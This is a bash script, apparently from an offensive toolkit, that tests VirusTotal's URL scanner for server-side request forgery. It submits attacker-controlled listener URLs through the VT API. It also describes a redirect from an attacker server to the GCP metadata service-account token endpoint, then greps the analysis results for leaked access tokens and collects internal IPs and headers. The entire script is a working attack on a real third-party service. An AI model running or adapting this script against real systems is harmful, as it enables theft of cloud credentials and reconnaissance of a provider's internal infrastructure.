#!/usr/bin/env bash
# VirusTotal — OOB SSRF confirmation
# Used after vt-attack.sh if VT actually fetches the URL to an SSRF target
# Requires: VT_API_KEY, COLLAB_URL (your interactsh/webhook.site URL)
#
# How to get a COLLAB_URL:
#   Option A: interactsh-client (if installed): interactsh-client -v
#   Option B: https://webhook.site → copy your unique URL
#   Option C: ngrok: ngrok http 8080 → use the https://xxx.ngrok.io URL
#
# Run: VT_API_KEY=<key> COLLAB_URL=https://webhook.site/<id> bash scripts/vt-ssrf-oob.sh

set -euo pipefail
: "${VT_API_KEY:?Set VT_API_KEY}"
: "${COLLAB_URL:?Set COLLAB_URL to your OOB listener URL}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
BASE="https://www.virustotal.com/api/v3"

c() { curl -sk --connect-timeout 15 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }

echo "══════════════════════════════════════════════════"
echo "OOB SSRF Test — VirusTotal URL Scanner"
echo "COLLAB_URL: ${COLLAB_URL}"
echo "══════════════════════════════════════════════════"

echo ""
echo "[1] Submitting OOB URL directly..."
RESP=$(c -X POST "${BASE}/urls" --data-urlencode "url=${COLLAB_URL}/vt-direct")
ID=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
echo "Analysis ID: ${ID}"

echo ""
echo "[2] Submitting redirect chain: COLLAB → GCP IMDS..."
# If you control a server that redirects to metadata.google.internal,
# submit that URL to VT. If VT follows redirects without validation:
# VT → your server → (302) → metadata.google.internal → GCP token
echo "NOTE: For redirect chain test, set up:"
echo "  nginx/Flask: location / { return 302 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token; }"
echo "  Then submit your server's URL"
echo ""
REDIR_RESP=$(c -X POST "${BASE}/urls" --data-urlencode "url=${COLLAB_URL}/redirect-to-imds")
REDIR_ID=$(echo "$REDIR_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
echo "Redirect chain analysis ID: ${REDIR_ID}"

echo ""
echo "[3] Waiting 30s for VT scanner to fetch URL..."
sleep 30

echo ""
echo "[4] Check COLLAB_URL for incoming requests (manual step)"
echo "Visit ${COLLAB_URL} and look for:"
echo "  - User-Agent of VT scanner (reveals tech stack)"
echo "  - Source IP (reveals GCP datacenter)"
echo "  - X-Forwarded-For (reveals internal IPs)"
echo "  - Any GCP metadata headers"

echo ""
echo "[5] Polling analysis results..."
if [ -n "$ID" ]; then
  RESULT=$(c "${BASE}/analyses/${ID}")
  echo "=== Direct OOB result ==="
  echo "$RESULT" | python3 -m json.tool 2>/dev/null | head -30

  # Check if result contains any GCP token data
  if echo "$RESULT" | grep -qE "access_token|token_type|Bearer|ya29\.|\"iss\":"; then
    echo ""
    echo "!!! CRITICAL: GCP TOKEN FOUND IN VT ANALYSIS RESULT !!!"
    echo "$RESULT" | python3 -m json.tool 2>/dev/null
  fi
fi

if [ -n "$REDIR_ID" ]; then
  echo ""
  echo "=== Redirect chain result ==="
  REDIR_RESULT=$(c "${BASE}/analyses/${REDIR_ID}")
  echo "$REDIR_RESULT" | python3 -m json.tool 2>/dev/null | head -30
fi

echo ""
echo "Done. Check your OOB listener at: ${COLLAB_URL}"
